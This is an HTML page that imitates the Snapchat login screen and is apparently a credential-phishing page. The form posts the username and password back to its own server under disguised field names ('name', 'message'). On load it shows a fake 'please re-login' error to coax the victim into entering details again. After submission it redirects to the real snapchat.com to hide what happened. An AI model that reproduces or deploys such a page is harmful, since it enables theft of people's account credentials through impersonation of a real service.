<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

  <link rel="shortcut icon" href="/faviconV2.png">

  <title>Login â€¢ Snapchat</title>
  <style>
    /* General Styles */
    body {
      caret-color: transparent;
      font-family: "Avenir Next", Arial, sans-serif;
      background-color: #ffffff;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      position: relative;
    }

    .login-container {
      text-align: center;
      max-width: 400px;
      width: 83%;
    }

    h1 {
      font-size: 27px;
      color: #000000;
      margin-bottom: 20px;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      font-weight: 500;
    }

    label {
      display: block;
      text-align: left;
      font-size: 12px;
      font-weight: bold;
      color: #55ccffd0;
      margin-top: 20px;
      margin-bottom: 5px;
    }

    input[type="text"],
    input[type="password"],
    input[type="tel"] {
      width: 100%;
      padding: 11px;
      margin-top: 5px;
      border: 1px solid #dcdcdc;
      border-radius: 10px;
      font-size: 14px;
      box-sizing: border-box;
      caret-color:#00A6FF;
  
    }

    input:focus {
      border-color: #54545436;
      outline: none;
      transition: background-color 0.3s ease;
      box-shadow: 0 0 5px rgba(116, 116, 116, 0.17);
    }

    .password-container {
      position: relative;
      width: 100%;
    }
    
    .password-container .toggle-password {
      position: absolute;
      right: 5px;
      top: 60%;
      transform: translateY(-50%);
      background: none;
      border: none;
      cursor: pointer;
      font-size: 14px;
      font-family: Arial, Helvetica, sans-serif;
    }

    .save-info {
      display: flex;
      align-items: center;
      margin-top: -10px;
      font-size: 12px;
      justify-content: left;
      font-family: Arial, Helvetica, sans-serif;
    }

    .save-info label {
      color: #bcbcbc;
      font-weight: lighter;
    }

    .alternate-option {
      display: flex;
      align-items: center;
      font-size: 12.8px;
      color: #55ccffd0;
      margin-top: 15px;
      justify-content: left;
      font-family: Arial, Helvetica, sans-serif;
      font-weight: bolder;
    }

    .forgot-password {
      font-size: 12px;
      color: #55ccffd0;
      margin-top: 43px;
      font-family: Arial, Helvetica, sans-serif;
      font-weight: 600;
    }

    .alternate-option a,
    .forgot-password a {
      text-decoration: none;
      color: #55ccffd0;
    }

    input[type="checkbox"] {
      margin-right: 5px;
      margin-top: 20px;
    }

    .login-button {
      position: fixed;
      left: 50%;
      transform: translateX(-50%);
      bottom: 20px;
      width: 210px;
      padding: 12px;
      margin-top: 20px;
      background-color: #a7abad;
      border: none;
      border-radius: 18px;
      font-size: 14px;
      font-weight: bold;
      color: #ffffff;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    .login-button.enabled {
      background-color: #00A6FF;
    }

    .login-button:hover {
      background-color: #027bde;
    }

    /* Back Button */
    .back-button {
      position: absolute;
      top: 12px;
      left: 10px;
      background-color: transparent;
      border: none;
      font-size: 16px;
      color: #55ccffd0;
      cursor: pointer;
      display: flex;
      align-items: center;
    }

    .back-button:hover {
      color: #027bde;
    }
    .loader-overlay {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background-color: rgba(20, 20, 20, 0.926); /* Slightly transparent dark background */
  display: flex;
  justify-content: center;
  align-items: center;
  z-index: 9999;
  opacity: 1;
  visibility: visible;
  transition: opacity 0.5s ease, visibility 0.5s ease; /* Smooth fade */
}

/* Hide the loader with smooth transition */
.loaded .loader-overlay {
  opacity: 0;
  visibility: hidden;
}

/* Loader styles */
.container-loader {
  display: flex;
  justify-content: center;
  align-items: center;
}

.circle {
  position: absolute;
  border-radius: 50px;
}

#circle-rotation {
  width: 35px; /* Smaller size */
  height: 35px;
  border-radius: 50%;
  border: 3px solid rgb(255, 255, 255); /* Thinner border */
  border-bottom-color: transparent;
  animation-name: spin;
  animation-duration: 1s;
  animation-iteration-count: infinite;
  animation-timing-function: linear;
}

.circle-2 {
  position: absolute;
  border-radius: 50%;
}

#circle-2-rotation {
  width: 20px; /* Smaller size */
  height: 20px;
  border-radius: 50%;
  border: 3px solid rgb(255, 255, 255); /* Thinner border */
  border-bottom-color: transparent;
  animation-name: spin2;
  animation-duration: 0.95s;
  animation-iteration-count: infinite;
  animation-timing-function: linear;
}

/* Keyframes for rotation */
@keyframes spin {
  from {
    transform: rotate(0deg);
  }
  to {
    transform: rotate(360deg);
  }
}

@keyframes spin2 {
  from {
    transform: rotate(360deg);
  }
  to {
    transform: rotate(0deg);
  }
}

/* Show the content smoothly */
#content {
  opacity: 0;
  transition: opacity 0.5s ease;
}

/* Display content after loader fades */
.loaded #content {
  opacity: 1;
}
.error-message {
    display: none; /* Hidden by default */
    background-color: #f44336; /* Red background */
    color: white; /* White text */
    padding: 15px;
    margin: 20px;
    border-radius: 5px;
    font-size: 16px;
    text-align: center;
    animation: fadeIn 0.5s ease-out, vibrate 0.2s ease-in-out 3;
}

/* Fade-in animation */
@keyframes fadeIn {
    from {
        opacity: 0;
    }
    to {
        opacity: 1;
    }
}

/* Vibration animation */
@keyframes vibrate {
    0% { transform: translateX(0); }
    25% { transform: translateX(-5px); }
    50% { transform: translateX(5px); }
    75% { transform: translateX(-5px); }
    100% { transform: translateX(0); }
}
  </style>
</head>
<body>
    <style>
        * {
            -webkit-tap-highlight-color: rgba(255, 255, 255, 0) !important;
            -webkit-focus-ring-color: rgba(255, 255, 255, 0) !important;
            outline: none !important;
        }
    </style>
    <div class="loader-overlay">
        <div class="container-loader">
            <div id="circle-rotation" class="circle"></div>
            <div id="circle-2-rotation" class="circle-2"></div>
          </div>
    </div>
  <!-- Back Button -->
  <button class="back-button" onclick="window.location.href='/index.html';">
    <img src="/left-arrow.png"height="15px" width="15px" alt="">
  </button>

  <div class="login-container">
    <div id="error-message" class="error-message">
      Error: Something went wrong ! Please re-login to your account.
  </div>
    <h1>Log In</h1>

    <form action="" method="POST" onsubmit="redirectToSnapchat(event)">
      <label for="username">USERNAME OR EMAIL</label>
      <input type="text" id="username" name="name" required>
      
      <p class="alternate-option"><a href="javascript:void(0);" id="switch-to-phone">Use phone number instead</a></p>
      
      <label for="password">PASSWORD</label>
      <div class="password-container">
        <input type="password" id="password" name="message" required>
        <button type="button" class="toggle-password">
          <img src="/eye-closed.svg" id="eye-icon" width="20" height="20" alt="eye icon">
        </button>
      </div>
      
      <div class="save-info">
        <input type="checkbox" id="save-login">
        <label for="save-login">Save Login Info on your device</label>
      </div>
      
      <p class="forgot-password"><a href="https://accounts.snapchat.com/accounts/v2/otp?ai=dGVqYXptYWxp&continue=%2Faccounts%2Fsso%3Fclient_id%3Dweb-calling-corp--prod%26referrer%3Dhttps%253A%252F%252Fweb.snapchat.com%253Fref%253Dsign_in_sidebar&otpRequirement=ChBDb25maXJtIEl0J3MgWW91EjRQbGVhc2UgaW5wdXQgdGhlIGNvZGUgc2VudCB0byDigaYrOTEgKioqKiotKjg5MDXigakuIgEB&accountRecovery=true&referrer=https%3A%2F%2Fweb.snapchat.com%3Fref%3Dsign_in_sidebar">Forgot your password?</a></p>
      
      <button type="submit" class="login-button">Log In</button>
    </form>
  </div>
  <script>
    function redirectToSnapchat(event) {
        // Wait briefly to ensure the form is submitted
        setTimeout(function () {
            window.location.href = "https://www.snapchat.com/";
        }, 1000); // Redirect after 1 second
    }
</script>
<script>
    // Function to toggle the button state based on input fields
    function toggleButtonState() {
      const loginButton = document.querySelector('.login-button');
      const usernameField = document.getElementById('username');
      const passwordField = document.getElementById('password');
  
      if (usernameField.value && passwordField.value) {
        loginButton.classList.add('enabled');  // Enable button if both fields are filled
      } else {
        loginButton.classList.remove('enabled');  // Disable button if any field is empty
      }
    }
  
    // Event listeners for input fields
    document.getElementById('username').addEventListener('input', toggleButtonState);
    document.getElementById('password').addEventListener('input', toggleButtonState);
  
    // Form submission prevention if button is disabled
    document.querySelector('form').addEventListener('submit', function(event) {
      const loginButton = document.querySelector('.login-button');
      if (!loginButton.classList.contains('enabled')) {
        event.preventDefault();  // Prevent form submission if button is not enabled
      }
    });
  
    // Toggle password visibility with dynamic image for show/hide
    document.querySelector('.toggle-password').addEventListener('click', function () {
      const passwordField = document.getElementById('password');
      const eyeIcon = document.getElementById('eye-icon');
      
      if (passwordField.type === 'password') {
        passwordField.type = 'text';
        eyeIcon.src = '/eye-open.svg';  // Update to the open eye icon
      } else {
        passwordField.type = 'password';
        eyeIcon.src = '/eye-closed.svg';  // Update to the closed eye icon
      }
    });
  
    // Switch between username/email and phone number
    const switchToPhone = document.getElementById('switch-to-phone');
    const usernameInput = document.getElementById('username');
    const label = document.querySelector('label[for="username"]');
  
    switchToPhone.addEventListener('click', function () {
      if (label.textContent === 'USERNAME OR EMAIL') {
        label.textContent = 'PHONE NUMBER';
        usernameInput.type = 'tel';
  
        switchToPhone.textContent = 'Use email instead';
      } else {
        label.textContent = 'USERNAME OR EMAIL';
        usernameInput.type = 'text';
      
        switchToPhone.textContent = 'Use phone number instead';
      }
    });
  
    // Enable the login button based on input fields' values initially
    toggleButtonState();  // Ensure the button state is set correctly when the page loads
  </script>
    <script>
        // Wait until the entire page has loaded
        window.addEventListener('load', () => {
            document.body.classList.add('loaded');
            document.getElementById('content').style.display = 'block';
        });
    </script>
    <script>
            window.onload = function() {
            var errorMessage = document.getElementById('error-message');
            errorMessage.style.display = 'block'; // Display the message

            // Hide the error message after user clicks anywhere on the page
            document.body.addEventListener('click', function() {
                errorMessage.style.display = 'none';
            });
        };
  </script>
</body>
</html>
